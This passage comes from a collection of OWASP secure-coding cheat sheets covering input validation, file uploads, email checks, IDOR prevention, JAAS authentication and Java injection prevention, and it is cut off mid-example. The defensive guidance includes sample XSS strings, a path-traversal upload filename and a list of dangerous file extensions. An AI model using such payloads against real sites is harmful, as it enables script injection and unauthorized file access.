data covering the whole input string `(^...$)` and **not** using \"any character\" wildcard (such as `.` or `\\S`)\r\n\r\n### Allow list vs block list\r\n\r\nIt is a common mistake to use block list validation in order to try to detect possibly dangerous characters and patterns like the apostrophe `'` character, the string `1=1`, or the `<script>` tag, but this is a massively flawed approach as it is trivial for an attacker to bypass such filters.\r\n\r\nPlus, such filters frequently prevent authorized input, like `O'Brian`, where the `'` character is fully legitimate. For more information on XSS filter evasion please see [this wiki page](https://owasp.org/www-community/xss-filter-evasion-cheatsheet).\r\n\r\nAllow list validation is appropriate for all input fields provided by the user. Allow list validation involves defining exactly what IS authorized, and by definition, everything else is not authorized.\r\n\r\nIf it's well structured data, like dates, social security numbers, zip codes, email addresses, etc. then the developer should be able to define a very strong validation pattern, usually based on regular expressions, for validating such input.\r\n\r\nIf the input field comes from a fixed set of options, like a drop down list or radio buttons, then the input needs to match exactly one of the values offered to the user in the first place.\r\n\r\n### Validating free-form Unicode text\r\n\r\nFree-form text, especially with Unicode characters, is perceived as difficult to validate due to a relatively large space of characters that need to be allowed.\r\n\r\nIt's also free-form text input that highlights the importance of proper context-aware output encoding and quite clearly demonstrates that input validation is **not** the primary safeguards against Cross-Site Scripting. If your users want to type apostrophe `'` or less-than sign `<` in their comment field, they might have perfectly legitimate reason for that and the application's job is to properly handle it throughout the whole life cycle of the data.\r\n\r\nThe primary means of input validation for free-form text input should be:\r\n\r\n- **Normalization:** Ensure canonical encoding is used across all the text and no invalid characters are present.\r\n- **Character category allow-listing:** Unicode allows listing categories such as \"decimal digits\" or \"letters\" which not only covers the Latin alphabet but also various other scripts used globally (e.g. Arabic, Cyrillic, CJK ideographs etc).\r\n- **Individual character allow-listing:** If you allow letters and ideographs in names and also want to allow apostrophe `'` for Irish names, but don't want to allow the whole punctuation category.\r\n\r\nReferences:\r\n\r\n- [Input validation of free-form Unicode text in Python](https://web.archive.org/web/20170717174432/https://ipsec.pl/python/2017/input-validation-free-form-unicode-text-python.html/)\r\n- [UAX 31: Unicode Identifier and Pattern Syntax](https://unicode.org/reports/tr31/)\r\n- [UAX 15: Unicode Normalization Forms](https://www.unicode.org/reports/tr15/)\r\n- [UAX 24: Unicode Script Property](https://unicode.org/reports/tr24/)\r\n\r\n### Regular expressions\r\n\r\nDeveloping regular expressions can be complicated, and is well beyond the scope of this cheat sheet.\r\n\r\nThere are lots of resources on the internet about how to write regular expressions, including this [site](https://www.regular-expressions.info/) and the [OWASP Validation Regex Repository](https://owasp.org/www-community/OWASP_Validation_Regex_Repository).\r\n\r\nWhen designing regular expression, be aware of [RegEx Denial of Service (ReDoS) attacks](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS). These attacks cause a program using a poorly designed Regular Expression to operate very slowly and utilize CPU resources for a very long time.\r\n\r\nIn summary, input validation should:\r\n\r\n- Be applied to all input data, at minimum.\r\n- Define the allowed set of characters to be accepted.\r\n- Define a minimum and maximum length for the data (e.g. `{1,25}`).\r\n\r\n## Allow List Regular Expression Examples\r\n\r\nValidating a U.S. Zip Code (5 digits plus optional -4)\r\n\r\n```text\r\n^\\d{5}(-\\d{4})?$\r\n```\r\n\r\nValidating U.S. State Selection From a Drop-Down Menu\r\n\r\n```text\r\n^(AA|AE|AP|AL|AK|AS|AZ|AR|CA|CO|CT|DE|DC|FM|FL|GA|GU|\r\nHI|ID|IL|IN|IA|KS|KY|LA|ME|MH|MD|MA|MI|MN|MS|MO|MT|NE|\r\nNV|NH|NJ|NM|NY|NC|ND|MP|OH|OK|OR|PW|PA|PR|RI|SC|SD|TN|\r\nTX|UT|VT|VI|VA|WA|WV|WI|WY)$\r\n```\r\n\r\n**Java Regex Usage Example:**\r\n\r\nExample validating the parameter \"zip\" using a regular expression.\r\n\r\n```java\r\nprivate static final Pattern zipPattern = Pattern.compile(\"^\\d{5}(-\\d{4})?$\");\r\n\r\npublic void doPost( HttpServletRequest request, HttpServletResponse response) {\r\n  try {\r\n      String zipCode = request.getParameter( \"zip\" );\r\n      if ( !zipPattern.matcher( zipCode ).matches()  {\r\n          throw new YourValidationException( \"Improper zipcode format.\" );\r\n      }\r\n      // do what you want here, after its been validated ..\r\n  } catch(YourValidationException e ) {\r\n      response.sendError( response.SC_BAD_REQUEST, e.getMessage() );\r\n  }\r\n}\r\n```\r\n\r\nSome Allow list validators have also been predefined in various open source packages that you can leverage. For example:\r\n\r\n- [Apache Commons Validator](http://commons.apache.org/proper/commons-validator/)\r\n\r\n## Client Side vs Server Side Validation\r\n\r\nBe aware that any JavaScript input validation performed on the client can be bypassed by an attacker that disables JavaScript or uses a Web Proxy. Ensure that any input validation performed on the client is also performed on the server.\r\n\r\n## Validating Rich User Content\r\n\r\nIt is very difficult to validate rich content submitted by a user. For more information, please see the XSS cheatsheet on [Sanitizing HTML Markup with a Library Designed for the Job](Cross_Site_Scripting_Prevention_Cheat_Sheet.md).\r\n\r\n## Preventing XSS and Content Security Policy\r\n\r\nAll user data controlled must be encoded when returned in the HTML page to prevent the execution of malicious data (e.g. XSS). For example `<script>` would be returned as `&lt;script&gt;`\r\n\r\nThe type of encoding is specific to the context of the page where the user controlled data is inserted. For example, HTML entity encoding is appropriate for data placed into the HTML body. However, user data placed into a script would need JavaScript specific output encoding.\r\n\r\nDetailed information on XSS prevention here: [OWASP XSS Prevention Cheat Sheet](Cross_Site_Scripting_Prevention_Cheat_Sheet.md)\r\n\r\n## File Upload Validation\r\n\r\nMany websites allow users to upload files, such as a profile picture or more. This section helps provide that feature securely.\r\n\r\nCheck the [File Upload Cheat Sheet](File_Upload_Cheat_Sheet.md).\r\n\r\n### Upload Verification\r\n\r\n- Use input validation to ensure the uploaded filename uses an expected extension type.\r\n- Ensure the uploaded file is not larger than a defined maximum file size.\r\n- If the website supports ZIP file upload, do validation check before unzip the file. The check includes the target path, level of compress, estimated unzip size.\r\n\r\n### Upload Storage\r\n\r\n- Use a new filename to store the file on the OS. Do not use any user controlled text for this filename or for the temporary filename.\r\n- When the file is uploaded to web, it's suggested to rename the file on storage. For example, the uploaded filename is *test.JPG*, rename it to *JAI1287uaisdjhf.JPG* with a random filename. The purpose of doing it to prevent the risks of direct file access and ambiguous filename to evade the filter, such as `test.jpg;.asp or /../../../../../test.jpg`.\r\n- Uploaded files should be analyzed for malicious content (anti-malware, static analysis, etc).\r\n- The file path should not be able to specify by client side. It's decided by server side.\r\n\r\n### Public Serving of Uploaded Content\r\n\r\n- Ensure uploaded images are served with the correct content-type (e.g. image/jpeg, application/x-xpinstall)\r\n\r\n### Beware of \"special\" files\r\n\r\nThe upload feature should be using an allow-list approach to only allow specific file types and extensions. However, it is important to be aware of the following file types that, if allowed, could result in security vulnerabilities:\r\n\r\n- **crossdomain.xml** / **clientaccesspolicy.xml:** allows cross-domain data loading in Flash, Java and Silverlight. If permitted on sites with authentication this can permit cross-domain data theft and CSRF attacks. Note this can get pretty complicated depending on the specific plugin version in question, so its best to just prohibit files named \"crossdomain.xml\" or \"clientaccesspolicy.xml\".\r\n- **.htaccess** and **.htpasswd:** Provides server configuration options on a per-directory basis, and should not be permitted. See [HTACCESS documentation](http://en.wikipedia.org/wiki/Htaccess).\r\n- Web executable script files are suggested not to be allowed such as `aspx, asp, css, swf, xhtml, rhtml, shtml, jsp, js, pl, php, cgi`.\r\n\r\n### Image Upload Verification\r\n\r\n- Use image rewriting libraries to verify the image is valid and to strip away extraneous content.\r\n- Set the extension of the stored image to be a valid image extension based on the detected content type of the image from image processing (e.g. do not just trust the header from the upload).\r\n- Ensure the detected content type of the image is within a list of defined image types (jpg, png, etc)\r\n\r\n## Email Address Validation\r\n\r\n### Syntactic Validation\r\n\r\nThe format of email addresses is defined by [RFC 5321](https://tools.ietf.org/html/rfc5321#section-4.1.2), and is far more complicated than most people realise. As an example, the following are all considered to be valid email addresses:\r\n\r\n- `\"><script>alert(1);</script>\"@example.org`\r\n- `user+subaddress@example.org`\r\n- `user@[IPv6:2001:db8::1]`\r\n- `\" \"@example.org`\r\n\r\nProperly parsing email addresses for validity with regular expressions is very complicated, although there are a number of [publicly available documents on regex](https://datatracker.ietf.org/doc/html/draft-seantek-mail-regexen-03#rfc.section.3).\r\n\r\nThe biggest caveat on this is that although the RFC defines a very flexible format for email addresses, most real world implementations (such as mail servers) use a far more restricted address format, meaning that they will reject addresses that are *technically* valid.  Although they may be technically correct, these addresses are of little use if your application will not be able to actually send emails to them.\r\n\r\nAs such, the best way to validate email addresses is to perform some basic initial validation, and then pass the address to the mail server and catch the exception if it rejects it. This means that the application can be confident that its mail server can send emails to any addresses it accepts. The initial validation could be as simple as:\r\n\r\n- The email address contains two parts, separated with an `@` symbol.\r\n- The email address does not contain dangerous characters (such as backticks, single or double quotes, or null bytes).\r\n    - Exactly which characters are dangerous will depend on how the address is going to be used (echoed in page, inserted into database, etc).\r\n- The domain part contains only letters, numbers, hyphens (`-`) and periods (`.`).\r\n- The email address is a reasonable length:\r\n    - The local part (before the `@`) should be no more than 63 characters.\r\n    - The total length should be no more than 254 characters.\r\n\r\n### Semantic Validation\r\n\r\nSemantic validation is about determining whether the email address is correct and legitimate. The most common way to do this is to send an email to the user, and require that they click a link in the email, or enter a code that has been sent to them. This provides a basic level of assurance that:\r\n\r\n- The email address is correct.\r\n- The application can successfully send emails to it.\r\n- The user has access to the mailbox.\r\n\r\nThe links that are sent to users to prove ownership should contain a token that is:\r\n\r\n- At least 32 characters long.\r\n- Generated using a [secure source of randomness](Cryptographic_Storage_Cheat_Sheet.md#secure-random-number-generation).\r\n- Single use.\r\n- Time limited (e.g, expiring after eight hours).\r\n\r\nAfter validating the ownership of the email address, the user should then be required to authenticate on the application through the usual mechanism.\r\n\r\n#### Disposable Email Addresses\r\n\r\nIn some cases, users may not want to give their real email address when registering on the application, and will instead provide a disposable email address. These are publicly available addresses that do not require the user to authenticate, and are typically used to reduce the amount of spam received by users' primary email addresses.\r\n\r\nBlocking disposable email addresses is almost impossible, as there are a large number of websites offering these services, with new domains being created every day. There are a number of publicly available lists and commercial lists of known disposable domains, but these will always be incomplete.\r\n\r\nIf these lists are used to block the use of disposable email addresses then the user should be presented with a message explaining why they are blocked (although they are likely to simply search for another disposable provider rather than giving their legitimate address).\r\n\r\nIf it is essential that disposable email addresses are blocked, then registrations should only be allowed from specifically-allowed email providers. However, if this includes public providers such as Google or Yahoo, users can simply register their own disposable address with them.\r\n\r\n#### Sub-Addressing\r\n\r\nSub-addressing allows a user to specify a _tag_ in the local part of the email address (before the `@` sign), which will be ignored by the mail server. For example, if that `example.org` domain supports sub-addressing, then the following email addresses are equivalent:\r\n\r\n- `user@example.org`\r\n- `user+site1@example.org`\r\n- `user+site2@example.org`\r\n\r\nMany mail providers (such as Microsoft Exchange) do not support sub-addressing. The most notable provider who does is Gmail, although there are many others that also do.\r\n\r\nSome users will use a different _tag_ for each website they register on, so that if they start receiving spam to one of the sub-addresses they can identify which website leaked or sold their email address.\r\n\r\nBecause it could allow users to register multiple accounts with a single email address, some sites may wish to block sub-addressing by stripping out everything between the `+` and `@` signs. This is not generally recommended, as it suggests that the website owner is either unaware of sub-addressing or wishes to prevent users from identifying them when they leak or sell email addresses. Additionally, it can be trivially bypassed by using [disposable email addresses](#disposable-email-addresses), or simply registering multiple email accounts with a trusted provider.\r\n"
    },
    {
      "Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.md": "# Insecure Direct Object Reference Prevention Cheat Sheet\r\n\r\n## Introduction\r\n\r\nInsecure Direct Object Reference (IDOR) is a vulnerability that arises when attackers can access or modify objects by manipulating identifiers used in a web application's URLs or parameters. It occurs due to missing access control checks, which fail to verify whether a user should be allowed to access specific data.\r\n\r\n## Examples\r\n\r\nFor instance, when a user accesses their profile, the application might generate a URL like this:\r\n\r\n```\r\nhttps://example.org/users/123\r\n```\r\n\r\nThe 123 in the URL is a direct reference to the user's record in the database, often represented by the primary key. If an attacker changes this number to 124 and gains access to another user's information, the application is vulnerable to Insecure Direct Object Reference. This happens because the app didn't properly check if the user had permission to view data for user 124 before displaying it.\r\n\r\nIn some cases, the identifier may not be in the URL, but rather in the POST body, as shown in the following example:\r\n\r\n```\r\n<form action=\"/update_profile\" method=\"post\">\r\n  <!-- Other fields for updating name, email, etc. -->\r\n  <input type=\"hidden\" name=\"user_id\" value=\"12345\">\r\n  <button type=\"submit\">Update Profile</button>\r\n</form>\r\n```\r\n\r\nIn this example, the application allows users to update their profiles by submitting a form with the user ID in a hidden field. If the app doesn't perform proper access control on the server-side, attackers can manipulate the \"user_id\" field to modify profiles of other users without authorization.\r\n\r\n## Identifier complexity\r\n\r\nIn some cases, using more complex identifiers like GUIDs can make it practically impossible for attackers to guess valid values. However, even with complex identifiers, access control checks are essential. If attackers obtain URLs for unauthorized objects, the application should still block their access attempts.\r\n\r\n## Mitigation\r\n\r\nTo mitigate IDOR, implement access control checks for each object that users try to access. Web frameworks often provide ways to facilitate this. Additionally, use complex identifiers as a defense-in-depth measure, but remember that access control is crucial even with these identifiers.\r\n\r\nAvoid exposing identifiers in URLs and POST bodies if possible. Instead, determine the currently authenticated user from session information. When using multi-step flows, pass identifiers in the session to prevent tampering.\r\n\r\nWhen looking up objects based on primary keys, use datasets that users have access to. For example, in Ruby on Rails:\r\n\r\n```\r\n// vulnerable, searches all projects\r\n@project = Project.find(params[:id])\r\n// secure, searches projects related to the current user\r\n@project = @current_user.projects.find(params[:id])\r\n```\r\n\r\nVerify the user's permission every time an access attempt is made. Implement this structurally using the recommended approach for your web framework.\r\n\r\nAs an additional defense-in-depth measure, replace enumerable numeric identifiers with more complex, random identifiers. You can achieve this by adding a column with random strings in the database table and using those strings in the URLs instead of numeric primary keys. Another option is to use UUIDs or other long random values as primary keys. Avoid encrypting identifiers as it can be challenging to do so securely.\r\n"
    },
    {
      "JAAS_Cheat_Sheet.md": "# JAAS Cheat Sheet\r\n\r\n## Introduction - What is JAAS authentication\r\n\r\nThe process of verifying the identity of a user or another system is authentication.\r\n\r\n[JAAS](https://docs.oracle.com/javase/8/docs/technotes/guides/security/jaas/JAASRefGuide.html), as an authentication framework manages the authenticated user's identity and credentials from login to logout.\r\n\r\nThe JAAS authentication lifecycle:\r\n\r\n1. Create `LoginContext`.\r\n2. Read the configuration file for one or more `LoginModules` to initialize.\r\n3. Call `LoginContext.initialize()` for each LoginModule to initialize.\r\n4. Call `LoginContext.login()` for each LoginModule.\r\n5. If login successful then call `LoginContext.commit()` else call `LoginContext.abort()`\r\n\r\n## Configuration file\r\n\r\nThe JAAS configuration file contains a `LoginModule` stanza for each `LoginModule` available for logging on to the application.\r\n\r\nA stanza from a JAAS configuration file:\r\n\r\n```text\r\nBranches\r\n{\r\n    USNavy.AppLoginModule required\r\n    debug=true\r\n    succeeded=true;\r\n}\r\n```\r\n\r\nNote the placement of the semicolons, terminating both `LoginModule` entries and stanzas.\r\n\r\nThe word required indicates the `LoginContext`'s `login()` method must be successful when logging in the user. The `LoginModule`-specific values `debug` and `succeeded` are passed to the `LoginModule`.\r\n\r\nThey are defined by the `LoginModule` and their usage is managed inside the `LoginModule`. Note, Options are Configured using key-value pairing such as `debug=\"true\"` and the key and value should be separated by a `=` sign.\r\n\r\n## Main.java (The client)\r\n\r\n- Execution syntax:\r\n\r\n```text\r\nJava –Djava.security.auth.login.config==packageName/packageName.config\r\n        packageName.Main Stanza1\r\n\r\nWhere:\r\n    packageName is the directory containing the config file.\r\n    packageName.config specifies the config file in the Java package, packageName.\r\n    packageName.Main specifies Main.java in the Java package, packageName.\r\n    Stanza1 is the name of the stanza Main() should read from the config file.\r\n```\r\n\r\n- When executed, the 1st command-line argument is the stanza from the config file. The Stanza names the `LoginModule` to be used. The 2nd argument is the `CallbackHandler`.\r\n- Create a new `LoginContext` with the arguments passed to `Main.java`.\r\n    - `loginContext = new LoginContext (args[0], new AppCallbackHandler());`\r\n- Call the LoginContext.Login Module:\r\n    - `loginContext.login();`\r\n- The value in succeeded Option is returned from `loginContext.login()`.\r\n- If the login was successful, a subject was created.\r\n\r\n## LoginModule.java\r\n\r\nA `LoginModule` must have the following authentication methods:\r\n\r\n- `initialize()`\r\n- `login()`\r\n- `commit()`\r\n- `abort()`\r\n- `logout()`\r\n\r\n### initialize()\r\n\r\nIn `Main()`, after the `LoginContext` reads the correct stanza from the config file, the `LoginContext` instantiates the `LoginModule` specified in the stanza.\r\n\r\n- `initialize()` methods signature:\r\n    - `Public void initialize (Subject subject, CallbackHandler callbackHandler, Map sharedState, Map options)`\r\n- The arguments above should be saved as follows:\r\n    - `this.subject = subject;`\r\n    - `this.callbackHandler = callbackHandler;`\r\n    - `this.sharedState = sharedState;`\r\n    - `this.options = options;`\r\n- What the `initialize()` method does:\r\n    - Builds a subject object of the `Subject` class contingent on a successful `login()`.\r\n    - Sets the `CallbackHandler` which interacts with the user to gather login information.\r\n    - If a `LoginContext` specifies 2 or more LoginModules, which is legal, they can share information via a `sharedState` map.\r\n    - Saves state information such as debug and succeeded in an options Map.\r\n\r\n### login()\r\n\r\nCaptures user supplied login information. The code snippet below declares an array of two callback objects which, when passed to the `callbackHandler.handle` method in the `callbackHandler.java` program, will be loaded with a username and password provided interactively by the user:\r\n\r\n```java\r\nNameCallback nameCB = new NameCallback(\"Username\");\r\nPasswordCallback passwordCB = new PasswordCallback (\"Password\", false);\r\nCallback[] callbacks = new Callback[] { nameCB, passwordCB };\r\ncallbackHandler.handle (callbacks);\r\n```\r\n\r\n- Authenticates the user\r\n- Retrieves the user supplied information from the callback objects:\r\n    - `String ID = nameCallback.getName ();`\r\n    - `char[] tempPW = passwordCallback.getPassword ();`\r\n- Compare `name` and `tempPW` to values stored in a repository such as LDAP.\r\n- Set the value of the variable succeeded and return to `Main()`.\r\n\r\n### commit()\r\n\r\nOnce the users credentials are successfully verified during `login()`, the JAAS authentication framework associates the credentials, as needed, with the subject.\r\n\r\nThere are two types of credentials, **Public** and **Private**:\r\n\r\n- Public credentials include public keys.\r\n- Private credentials include passwords and public keys.\r\n\r\nPrincipals (i.e. Identities the subject has other than their login name) such as employee number or membership ID in a user group are added to the subject.\r\n\r\nBelow, is an example `commit()` method where first, for each group the authenticated user has membership in, the group name is added as a principal to the subject. The subject's username is then added to their public credentials.\r\n\r\nCode snippet setting then adding any principals and a public credentials to a subject:\r\n\r\n```java\r\npublic boolean commit() {\r\n    If (userAuthenticated) {\r\n        Set groups = UserService.findGroups (username);\r\n        for (Iterator itr = groups.iterator (); itr.hasNext (); {\r\n            String groupName = (String) itr.next ();\r\n            UserGroupPrincipal group = new UserGroupPrincipal (GroupName);\r\n            subject.getPrincipals ().add (group);\r\n        }\r\n        UsernameCredential cred = new UsernameCredential (username);\r\n        subject.getPublicCredentials().add (cred);\r\n    }\r\n}\r\n```\r\n\r\n### abort()\r\n\r\nThe `abort()` method is called when authentication doesn't succeed. Before the `abort()` method exits the `LoginModule`, care should be taken to reset state including the username and password input fields.\r\n\r\n### logout()\r\n\r\nThe release of the users principals and credentials when `LoginContext.logout` is called:\r\n\r\n```java\r\npublic boolean logout() {\r\n    if (!subject.isReadOnly()) {\r\n        Set principals = subject.getPrincipals(UserGroupPrincipal.class);\r\n        subject.getPrincipals().removeAll(principals);\r\n        Set creds = subject.getPublicCredentials(UsernameCredential.class);\r\n        subject.getPublicCredentials().removeAll(creds);\r\n        return true;\r\n    } else {\r\n        return false;\r\n    }\r\n}\r\n```\r\n\r\n## CallbackHandler.java\r\n\r\nThe `callbackHandler` is in a source (`.java`) file separate from any single `LoginModule` so that it can service a multitude of LoginModules with differing callback objects:\r\n\r\n- Creates instance of the `CallbackHandler` class and has only one method, `handle()`.\r\n- A `CallbackHandler` servicing a LoginModule requiring username & password to login:\r\n\r\n```java\r\npublic void handle(Callback[] callbacks) {\r\n    for (int i = 0; i < callbacks.length; i++) {\r\n        Callback callback = callbacks[i];\r\n        if (callback instanceof NameCallback) {\r\n            NameCallback nameCallBack = (NameCallback) callback;\r\n            nameCallBack.setName(username);\r\n    }  else if (callback instanceof PasswordCallback) {\r\n            PasswordCallback passwordCallBack = (PasswordCallback) callback;\r\n            passwordCallBack.setPassword(password.toCharArray());\r\n        }\r\n    }\r\n}\r\n```\r\n\r\n## Related Articles\r\n\r\n- [JAAS in Action](https://jaasbook.wordpress.com/2009/09/27/intro/), Michael Coté, posted on September 27, 2009, URL as 5/14/2012.\r\n- Pistoia Marco, Nagaratnam Nataraj, Koved Larry, Nadalin Anthony from book [\"Enterprise Java Security\" - Addison-Wesley, 2004](https://www.oreilly.com/library/view/enterprise-javatm-security/0321118898/).\r\n\r\n## Disclosure\r\n\r\nAll of the code in the attached JAAS cheat sheet has been copied verbatim from this [free source](https://jaasbook.wordpress.com/2009/09/27/intro/).\r\n"
    },
    {
      "Java_Security_Cheat_Sheet.md": "# Java Security Cheat Sheet\r\n\r\n## Injection Prevention in Java\r\n\r\nThis section aims to provide tips to handle *Injection* in Java application code.\r\n\r\nSample code used in tips is located [here](https://github.com/righettod/injection-cheat-sheets).\r\n\r\n### What is Injection\r\n\r\n[Injection](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A1-Injection) in OWASP Top 10 is defined as following:\r\n\r\n*Consider anyone who can send untrusted data to the system, including external users, internal users, and administrators.*\r\n\r\n### General advices to prevent Injection\r\n\r\nThe following point can be applied, in a general way, to prevent *Injection* issue:\r\n\r\n1. Apply **Input Validation** (using \"allow list\" approach) combined with **Output Sanitizing+Escaping** on user input/output.\r\n2. If you need to interact with system, try to use API features provided by your technology stack (Java / .Net / PHP...) instead of building command.\r\n\r\nAdditional advices are provided on this [cheatsheet](Input_Validation_Cheat_Sheet.md).\r\n\r\n## Specific Injection types\r\n\r\n*Examples in this section will be provided in Java technology (see Maven project associated) but advices are applicable to others technologies like .Net / PHP / Ruby / Python...*\r\n\r\n### SQL\r\n\r\n#### Symptom\r\n\r\nInjection of this type occur when the application uses untrusted user input to build an SQL query using a String and execute it.\r\n\r\n#### How to prevent\r\n\r\nUse *Query Parameterization* in order to prevent injection.\r\n\r\n#### Example\r\n\r\n``` java\r\n/*No DB framework used here in order to show the real use of\r\n  Prepared Statement from Java API*/\r\n/*Open connection with H2 database and use it*/\r\nClass.forName(\"org.h2.Driver\");\r\nString jdbcUrl = \"jdbc:h2:file:\" + new File(\".\").getAbsolutePath() + \"/target/db\";\r\ntry (Connection con = DriverManager.getConnection(jdbcUrl)) {\r\n\r\n    /* Sample A: Select data using Prepared Statement*/\r\n    String query = \"select * from color where friendly_name = ?\";\r\n    List<String> colors = new ArrayList<>();\r\n    try (PreparedStatement pStatement = con.prepareStatement(query)) {\r\n        pStatement.setString(1, \"yellow\");\r\n        try (ResultSet rSet = pStatement.executeQuery()) {\r\n            while (rSet.next()) {\r\n                colors.add(rSet.getString(1));\r\n            }\r\n        }\r\n    }\r\n\r\n    /* Sample B: Insert data using Prepared Statement*/\r\n    query = \"insert into color(friendly_name, red, green, blue) values(?, ?, ?, ?)\";\r\n    int insertedRecordCount;\r\n    try (PreparedStatement pStatement = con.prepareStatement(query)) {\r\n        pStatement.setString(1, \"orange\");\r\n        pStatement.setInt(2, 239);\r\n        pStatement.setInt(3, 125);\r\n        pStatement.setInt(4, 11);\r\n        insertedRecordCount = pStatement.executeUpdate();\r\n    }\r\n \r\n   /* Sample C: Update data using Prepared Statement*/\r\n    query = \"update color set blue = ? where friendly_name = ?\";\r\n    int updatedRecordCount;\r\n    try (PreparedStatement pStatement = con.prepareStatement(query)) {\r\n        pStatement.setInt(1, 10);\r\n        pStatement.setString(2, \"orange\");\r\n        updatedRecordCount = pStatement.executeUpdate();\r\n    }\r\n\r\n   /* Sample D: Delete data using Prepared Statement*/\r\n    query = \"delete from color where friendly_name = ?\";\r\n    int deletedRecordCount;\r\n    try (PreparedStatement pStatement = con.prepareStatement(query)) {\r\n        pStatement.setString(1, \"orange\");\r\n        deletedRecordCount = pStatement.executeUpdate();\r\n    }\r\n\r\n}\r\n```\r\n\r\n#### References\r\n\r\n- [SQL Injection Prevention Cheat Sheet](SQL_Injection_Prevention_Cheat_Sheet.md)\r\n\r\n### JPA\r\n\r\n#### Symptom\r\n\r\nInjection of this type occur when the application uses untrusted user input to build a JPA query using a String and execute it. It's quite similar to SQL injection but here the altered language is not SQL but JPA QL.\r\n\r\n#### How to prevent\r\n\r\nUse Java Persistence Query Language **Query Parameterization** in order to prevent injection.\r\n\r\n#### Example\r\n\r\n``` java\r\nEntityManager entityManager = null;\r\ntry {\r\n    /* Get a ref on EntityManager to access DB */\r\n    entityManager = Persistence.createEntityManagerFactory(\"testJPA\").createEntityManager();\r\n\r\n    /* Define parameterized query prototype using named parameter to enhance readability */\r\n    String queryPrototype = \"select c from Color c where c.friendlyName = :colorName\";\r\n\r\n    /* Create the query, set the named parameter and execute the query */\r\n    Query queryObject = entityManager.createQuery(queryPrototype);\r\n    Color c = (Color) queryObject.setParameter(\"colorName\", \"yellow\").getSingleResult();\r\n\r\n} finally {\r\n    if (entityManager != null && entityManager.isOpen()) {\r\n        entityManager.close();\r\n    }\r\n}\r\n```\r\n\r\n#### References\r\n\r\n- [SQLi and JPA](https://software-security.sans.org/developer-how-to/fix-sql-injection-in-java-persistence-api-jpa)\r\n\r\n### Operating System\r\n\r\n#### Symptom\r\n\r\nInjection of this type occur when the application uses untrusted user input to build an Operating System command using a String and execute it.\r\n\r\n#### How to prevent\r\n\r\nUse technology stack **API** in order to prevent injection.\r\n\r\n#### Example\r\n\r\n``` java\r\n/* The context taken is, for example, to perform a PING against a computer.\r\n* The prevention is to use the feature provided by the Java API instead of building\r\n* a system command as String and execute it */\r\nInetAddress host = InetAddress.getByName(\"localhost\");\r\nvar reachable = host.isReachable(5000);\r\n```\r\n\r\n#### References\r\n\r\n- [Command Injection](https://owasp.org/www-community/attacks/Command_Injection)\r\n\r\n### XML: XPath Injection\r\n\r\n#### Symptom\r\n\r\nInjection of this type occur when the application uses untrusted user input to build a XPath query using a String and execute it.\r\n\r\n#### How to prevent\r\n\r\nUse **XPath Variable Resolver** in order to prevent injection.\r\n\r\n#### Example\r\n\r\n**Variable Resolver** implementation.\r\n\r\n``` java\r\n/**\r\n * Resolver in order to define parameter for XPATH expression.\r\n *\r\n */\r\npublic class SimpleVariableResolver implements XPathVariableResolver {\r\n\r\n    private final Map<QName, Object> vars = new HashMap<QName, Object>();\r\n\r\n    /**\r\n     * External methods to add parameter\r\n     *\r\n     * @param name Parameter name\r\n     * @param value Parameter value\r\n     */\r\n    public void addVariable(QName name, Object value) {\r\n        vars.put(name, value);\r\n    }\r\n\r\n    /**\r\n     * {@inheritDoc}\r\n     *\r\n     * @see javax.xml.xpath.XPathVariableResolver#resolveVariable(javax.xml.namespace.QName)\r\n     */\r\n    public Object resolveVariable(QName variableName) {\r\n        return vars.get(variableName);\r\n    }\r\n}\r\n```\r\n\r\nCode using it to perform XPath query.\r\n\r\n``` java\r\n/*Create a XML document builder factory*/\r\nDocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\r\n\r\n/*Disable External Entity resolution for different cases*/\r\n//Do not performed here in order to focus on variable resolver code\r\n//but do it for production code !\r\n\r\n/*Load XML file*/\r\nDocumentBuilder builder = dbf.newDocumentBuilder();\r\nDocument doc = builder.parse(new File(\"src/test/resources/SampleXPath.xml\"));\r\n\r\n/* Create and configure parameter resolver */\r\nString bid = \"bk102\";\r\nSimpleVariableResolver variableResolver = new SimpleVariableResolver();\r\nvariableResolver.addVariable(new QName(\"bookId\"), bid);\r\n\r\n/*Create and configure XPATH expression*/\r\nXPath xpath = XPathFactory.newInstance().newXPath();\r\nxpath.setXPathVariableResolver(variableResolver);\r\nXPathExpression xPathExpression = xpath.compile(\"//book[@id=$bookId]\");\r\n\r\n/* Apply expression on XML document */\r\nObject nodes = xPathExpression.evaluate(doc, XPathConstants.NODESET);\r\nNodeList nodesList = (NodeList) nodes;\r\nElement book = (Element)nodesList.item(0);\r\nvar containsRalls = book.getTextContent().contains(\"Ralls, Kim\");\r\n```\r\n\r\n#### References\r\n\r\n- [XPATH Injection](https://owasp.org/www-community/attacks/XPATH_Injection)\r\n\r\n### HTML/JavaScript/CSS\r\n\r\n#### Symptom\r\n\r\nInjection of this type occur when the application uses untrusted user input to build an HTTP response and sent it to browser.\r\n\r\n#### How to prevent\r\n\r\nEither apply strict input validation (\"allow list\" approach) or use output sanitizing+escaping if input validation is not possible (combine both every time is possible).\r\n\r\n#### Example\r\n\r\n``` java\r\n/*\r\nINPUT WAY: Receive data from user\r\nHere it's recommended to use strict input validation using \"allow list\" approach.\r\nIn fact, you ensure that only allowed characters are part of the input received.\r\n*/\r\n\r\nString userInput = \"You user login is owasp-user01\";\r\n\r\n/* First we check that the value contains only expected character*/\r\nif (!Pattern.matches(\"[a-zA-Z0-9\\\\s\\\\-]{1,50}\", userInput))\r\n{\r\n    return false;\r\n}\r\n\r\n/* If the first check pass then ensure that potential dangerous character\r\nthat we have allowed for business requirement are not used in a dangerous way.\r\nFor example here we have allowed the character '-', and, this can\r\nbe used in SQL injection so, we\r\nensure that this character is not used is a continuous form.\r\nUse the API COMMONS LANG v3 to help in String analysis...\r\n*/\r\nIf (0 != StringUtils.countMatches(userInput.replace(\" \", \"\"), \"--\"))\r\n{\r\n    return false;\r\n}\r\n\r\n/*\r\nOUTPUT WAY: Send data to user\r\nHere we escape + sanitize any data sent to user\r\nUse the OWASP Java HTML Sanitizer API to handle sanitizing\r\nUse the OWASP Java Encoder API to handle HTML tag encoding (escaping)\r\n*/\r\n\r\nString outputToUser = \"You <p>user login</p> is <strong>owasp-user01</strong>\";\r\noutputToUser += \"<script>alert(22);</script><img src='#' onload='javascript:alert(23);'>\";\r\n\r\n/* Create a sanitizing policy that only allow tag '<p>' and 